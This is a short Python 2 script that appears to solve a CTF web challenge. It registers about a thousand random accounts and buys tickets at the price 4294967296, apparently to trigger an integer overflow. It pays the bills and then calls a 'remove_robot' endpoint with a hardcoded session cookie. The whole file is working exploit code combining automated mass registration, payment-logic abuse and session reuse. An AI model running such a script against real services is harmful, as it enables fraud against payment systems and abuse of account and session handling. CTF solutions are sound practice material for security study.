import os
import requests
import time
username = []
password = []
# generate a lot of account
for i in range(1050):
	s = os.urandom(20).encode('hex')
	username.append(s)
	password.append(s)
url_register = "http://117.51.147.155:5050/ctf/api/register?name={0}&password={1}"
url_buy_ticket = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
url_pay_ticket = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={0}"
url_main = "http://117.51.147.155:5050/ctf/api/remove_robot?id={0}&ticket={1}"


def start_remove(y_id,y_ticket):
	mycookie = {
		"user_name":"asdfghjklasdfghjkl",
		"REVEL_SESSION":"d083754c3b6a4bd5756272cdad1ae65a"
	}
	r = requests.get(url_main.format(y_id,y_ticket),cookies=mycookie)
	if r.status_code == 200:
		return True
	else:
		return False
for i in range(1000):
	print 'start create ....{0}'.format(i)
	user = username[i]
	passwd = password[i]
	r = requests.get(url_register.format(user,passwd))
	u_cookie = r.cookies['user_name']
	u_session = r.cookies['REVEL_SESSION']
	u_cookie_data = {
		"user_name":u_cookie,
		"REVEL_SESSION":u_session
	}
	r = requests.get(
		url_buy_ticket,
		cookies=u_cookie_data
	)
	# print r.json()
	bill = r.json()['data'][0]['bill_id'] # number of bill

	r = requests.get(
		url_pay_ticket.format(bill),
		cookies=u_cookie_data
	)
	y_id = r.json()['data'][0]['your_id']
	y_ticket = r.json()['data'][0]['your_ticket']
	print y_id
	print y_ticket
	time.sleep(5)
	stata = start_remove(y_id,y_ticket)
	if stata == False:
		print "Error"
